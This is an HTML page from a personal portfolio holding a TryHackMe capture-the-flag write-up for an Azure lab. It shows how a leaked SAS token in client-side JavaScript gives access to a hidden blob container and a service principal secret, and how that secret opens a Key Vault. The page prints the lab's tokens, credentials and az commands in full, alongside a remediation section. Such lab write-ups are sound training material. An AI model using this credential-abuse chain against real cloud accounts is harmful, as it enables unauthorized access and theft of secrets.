@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Cabana // writeup</title>
+    <meta name="description" content="An over-privileged SAS token left in client-side JavaScript opens the storage account, and from there a service principal, a Key Vault and the three shards of the flag.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Crypto Cabana</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Cloud / Cryptography</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-05</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Cloud / Azure / Cryptography / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> cryptocabana.md</span>
+                </div>
+                <p class="writeup-summary">An over-privileged SAS token left in client-side JavaScript opens the storage account, and from there a service principal, a Key Vault and the three shards of the flag.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/cryptocabana.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="cryptocabana.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>TryHackMe — CryptoCabana (Hacker Holidays · The Byte Lotus Hotel)</h1>
+<ul><li>Category: Cloud (Azure)</li></ul>
+<ul><li>Difficulty: Medium</li></ul>
+<ul><li>Target: https://cryptocabanaf5scjagc.z13.web.core.windows.net/</li></ul>
+<p>Flag: THM{n0t_ur_k3ys_n0t_ur_c01ns!} &quot;Not your keys, not your coins.&quot; — exactly the point of this room.</p>
+<h1>Summary / Story</h1>
+<p>A backup kiosk website lets victims paste a seed phrase and &quot;back it up&quot; to a private vault. The page promises, in four words: &quot;Backed up. Sleep easy.&quot; But the kiosk silently ships a fully-working SAS token in its own JavaScript, which lets anyone list and read every container in the storage account — including a vault container the page never mentions. That vault holds a service-principal client secret, and the service principal can read an Azure Key Vault. The Key Vault holds three shards of the flag. One shard was &quot;rotated&quot; (a trap), but its old value is still in a previous secret version.</p>
+<h1>Step 1 — What the kiosk gives you for free (client-side trust)</h1>
+<p>Fetch the landing page and its JS. You don&#39;t even need to click anything — the app loads app.js automatically. curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ | head -50 curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js app.js contains everything you need: const STORAGE_ACCOUNT = &quot;cryptocabanaf5scjagc&quot;; const BACKUPS_CONTAINER = &quot;backups&quot;; const BACKUP_SAS = &quot;?sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00: 00:00Z&amp;spr=https&amp;sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D&quot;; Reading the SAS parameters: Param Meaning Value sv Storage service version 2022-11-02 ss=b Signed service: Blob only blob srt=sco Signed resource types service, container, object sp=rl Signed permissions read + list se Expiry 2099-12-31 (never expires!) st Start 2024-01-01 Vuln #1 — Over-privileged, never-expiring SAS token shipped in client-side code. The SAS should have been scoped to only the backups container and only write (sp=cw or sp=wa), not read+list across the</p>
+<p>whole account.</p>
+<h1>Step 2 — Follow the trust somewhere the kiosk never points you</h1>
+<p>Use the SAS to list containers. (I used the Azure SDK, but the equivalent az storage command is below.) # Equivalent in Azure CLI / Cloud Shell: az storage container list --account-name cryptocabanaf5scjagc \ --sas-token &quot;sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z &amp;spr=https&amp;sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D&quot; \ --output table Containers:</p>
+<ul><li>$web (the public website)</li></ul>
+<ul><li>backups (empty — where the kiosk writes)</li></ul>
+<ul><li>vault← the kiosk never mentions this one!</li></ul>
+<p>This is the second itinerary hint: &quot;Follow that trust somewhere the kiosk&#39;s own page never once points you.&quot; List and download the vault blobs: az storage blob list --account-name cryptocabanaf5scjagc \ --container-name vault \ --sas-token &quot;sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st =2024-01-01T00:00:00Z&amp;spr=https&amp;sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0% 3D&quot; \ --output table az storage blob download --account-name cryptocabanaf5scjagc \ --container-name vault \ --name backup-service-account.json --file backup-service-account.json \ --sas-token &quot;&lt;same SAS&gt;&quot; az storage blob download --account-name cryptocabanaf5scjagc \ --container-name vault \ --name seed_phrase.txt --file seed_phrase.txt \ --sas-token &quot;&lt;same SAS&gt;&quot;</p>
+<h2>backup-service-account.json — the second, more valuable set of keys</h2>
+<p>{ &quot;client_id&quot;: &quot;dbcf2923-e4eb-4b72-a0a4-688aa1185cf5&quot;, &quot;client_secret&quot;: &quot;UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg&quot;, &quot;key_vault_name&quot;: &quot;ccabana-kv-f5scjagc&quot;, &quot;key_vault_uri&quot;: &quot;https://ccabana-kv-f5scjagc.vault.azure.net/&quot;, &quot;tenant_id&quot;: &quot;8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c&quot;, &quot;note&quot;: &quot;CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT&quot; } An Azure service principal (client_id + client_secret) — the automation account that talks to the Key Vault. It was sitting in an unsecured blob container.</p>
+<h2>seed_phrase.txt</h2>
+<p>velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp A decoy seed phrase. Nice touch, not the flag. Vuln #2 — Secrets stored in plaintext inside a blob container that is readable via a leaked SAS token. Service principal credentials should live in the Key Vault (or use a managed identity), never as a downloadable blob.</p>
+<h1>Step 3 — Use the service principal to read the Key Vault</h1>
+<p>Authenticate as the service principal: az login --service-principal \ --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \ --password &#39;UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg&#39; \ --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c az account show List the vault secrets: az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table Secrets found:</p>
+<ul><li>key-shard-1</li></ul>
+<ul><li>key-shard-2</li></ul>
+<ul><li>key-shard-3</li></ul>
+<ul><li>master-key</li></ul>
+<p>Read the secrets: az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3</p>
+<ul><li>key-shard-1 → THM{n0t_ur</li></ul>
+<ul><li>key-shard-3 → ur_c01ns!}</li></ul>
+<p>When you try master-key, you get Forbidden (RBAC) — the service principal is not granted getSecret on that secret. That&#39;s the vault &quot;that won&#39;t give up the real values on the first ask.&quot;</p>
+<h2>The &quot;rotated&quot; shard — look at previous versions</h2>
+<p>az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output table There are two versions of key-shard-2:</p>
+<ul><li>Current version value: <em>k3ys</em>n0t_ ← the real one</li></ul>
+<ul><li>An old/decoy version contains the text: Rotated this after IT flagged it -- old value should still be</li></ul>
+<p>recoverable if you know where to look. This is the @0xMia hint: &quot;if a value looks freshly rotated, ask yourself what it looked like five minutes before I&quot; — it&#39;s a trap to make you chase a &quot;rotated&quot; old value. The genuinely current shard is what you need. az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2</p>
+<ul><li>key-shard-2 → <em>k3ys</em>n0t_</li></ul>
+<h1>Step 4 — Assemble the flag</h1>
+<p>Concatenate the three shards in order: key-shard-1 = THM{n0t_ur key-shard-2 = <em>k3ys</em>n0t_ key-shard-3 = ur_c01ns!} THM{n0t_ur_k3ys_n0t_ur_c01ns!} Matching the answer format hint <em><strong>{</strong></em>_<strong>_</strong><strong>_</strong>*_<strong>_</strong>****}: n0t (3) <em> ur (2) </em> k3ys (4) <em> n0t (3) </em> ur (2) _ c01ns! (6).</p>
+<h1>How the exploit chain works (attack path)</h1>
+<ul><li>Public static site ($web) loads app.js which ships a full SAS token</li></ul>
+<p>with read + list permissions across the entire storage account, expiring in the year 2099.</p>
+<ul><li>Attacker lists all containers with the SAS → discovers a hidden vault</li></ul>
+<ul><li>Attacker downloads backup-service-account.json → obtains a service</li></ul>
+<p>principal client_id + client_secret stored in plaintext in blob storage.</p>
+<ul><li>Attacker authenticates to Azure as that service principal → has getSecret</li></ul>
+<p>access to the Key Vault.</p>
+<ul><li>Attacker reads key-shard-1, key-shard-2, key-shard-3 and</li></ul>
+<p>concatenates them →flag. master-key is RBAC-forbidden (that&#39;s the &quot;vault that won&#39;t give up the real values on the first ask&quot;), but you don&#39;t need it.</p>
+<h1>Root cause / vulnerabilities exploited</h1>
+<ul><li>Hard-coded, over-privileged, non-expiring SAS token in client-side JS.</li></ul>
+<p>The kiosk needs only write to the backups container, but the token grants read + list on the whole blob service, scoped to service, container, and object, valid until 2099.</p>
+<ul><li>Secrets stored in plaintext in a blob container. The service principal</li></ul>
+<p>credentials (client_secret) were sitting as a JSON blob readable with that SAS.</p>
+<ul><li>Over-broad RBAC on the Key Vault. The backup service principal could</li></ul>
+<p>read key-shard-* (the flag pieces). Least privilege was not applied.</p>
+<ul><li>&quot;Security by obscurity&quot; hidden container. The vault container was</li></ul>
+<p>never referenced by the site but was listable.</p>
+<h1>How to prevent / remediate (defense in depth)</h1>
+<ul><li>Don&#39;t put SAS tokens (or any credentials) in client-side code.</li></ul>
+<p>Use a server-side API/broker that proxies blob operations, or use a user-assigned managed identity that the server authenticates with.</p>
+<ul><li>Scope SAS tokens to the absolute minimum.</li></ul>
+<ul><li>Restrict to the single container (srt=c), not sco.</li></ul>
+<ul><li>Grant only write permissions (sp=w or sp=wa), never read/list.</li></ul>
+<ul><li>Set a short expiry (hours, not decades).</li></ul>
+<ul><li>Use Microsoft Entra / RBAC (Storage Blob Data Contributor) instead</li></ul>
+<p>of shared-key SAS where possible.</p>
+<ul><li>Revoke/rotate SAS immediately if leaked.</li></ul>
+<ul><li>Never store secrets in blob storage.</li></ul>
+<p>Store service principal credentials in Azure Key Vault and have the app retrieve them at runtime; better yet, use managed identity so there is no secret at all.</p>
+<ul><li>Apply least privilege in Key Vault RBAC.</li></ul>
+<p>Grant each identity only the secret get permissions it needs (Key Vault Secrets User) and no more. The backup account should not be able to read flag shards.</p>
+<ul><li>Use Key Vault secret versioning properly + audit.</li></ul>
+<p>Enable diagnostic logging / auditing on Key Vault and Storage to detect anomalous access. Monitor for reads of secrets you never expected to be read.</p>
+<ul><li>Remove sensitive data that &quot;leaves the vault.&quot;</li></ul>
+<p>The note literally says &quot;Rotate this if it ever leaves the vault.&quot; The value left the vault and was never rotated. Secret rotation should be automated (e.g., Key Vault + a rotation function).</p>
+<ul><li>Container access hardening.</li></ul>
+<p>Don&#39;t rely on an unlinked container name being secret. If a container holds anything sensitive, deny anonymous/SAS listing access to it.</p>
+<h1>Commands cheat sheet (all in one place) 1. Grab the public site + its JS (freely exposed data) curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js # SAS token found in app.js SAS=&quot;sv=202 2-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=ZAo 05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D&quot; # 2. List containers (the kiosk never points to &#39;vault&#39;) az storage container list --account-name cryptocabanaf5scjagc --sas-token &quot;$SAS&quot; --output table # 3. List + download the hidden vault blobs az storage blob list --account-name cryptocabanaf5scjagc --container-name vault --sas-token &quot;$SAS&quot; --output table az storage blob download --account-name cryptocabanaf5scjagc --container-name vault --name backup-service-account.json --file backup-service-account.json --sas-token &quot;$SAS&quot; az storage blob download --account-name cryptocabanaf5scjagc --container-name vault --name seed_phrase.txt --file seed_phrase.txt --sas-token &quot;$SAS&quot; # 4. Authenticate as the leaked service principal az login --service-principal \ --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \ --password &#39;UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg&#39; \ --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c az account show # 5. Read the Key Vault secrets (flag shards) az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --output table # spot the &quot;rotated&quot; trap az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 az keyvault secret show --vault-name ccabana-kv-f5scjagc --name master-key # Forbidden (RBAC) — not needed # 6. Assemble flag # key-shard-1 + key-shard-2 + key-shard-3 = # THM{n0t_ur + <em>k3ys</em>n0t_ + ur_c01ns!} echo &quot;THM{n0t_ur_k3ys_n0t_ur_c01ns!}&quot; Room: CryptoCabana · Byte Lotus Hotel · Hacker Holidays · @0xMia&#39;s story</h1>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/cryptocabana.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="cryptocabana.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
